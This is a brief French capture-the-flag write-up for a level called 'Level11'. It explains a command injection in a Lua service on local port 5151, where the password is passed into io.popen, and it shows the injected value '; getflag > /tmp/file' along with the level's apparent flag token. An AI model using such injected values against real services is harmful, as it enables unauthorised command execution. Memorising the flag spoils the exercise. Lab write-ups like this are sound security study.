## Level11:

sur le port 5151 un serveur est lance donc : 
```nc 127.0.0.1 5151```
```  prog = io.popen("echo "..pass.." | sha1sum", "r")```

Ici le mot de passe va etre envoye dans io.popen, donc si une commande comme ```; ls``` est envoye, la commande ls  va etre exec.  
Donc il suffit de faire un ``` ; getflag > /tmp/file``` pour exec la commande. 

fa6v5ateaw21peobuub8ipe6s
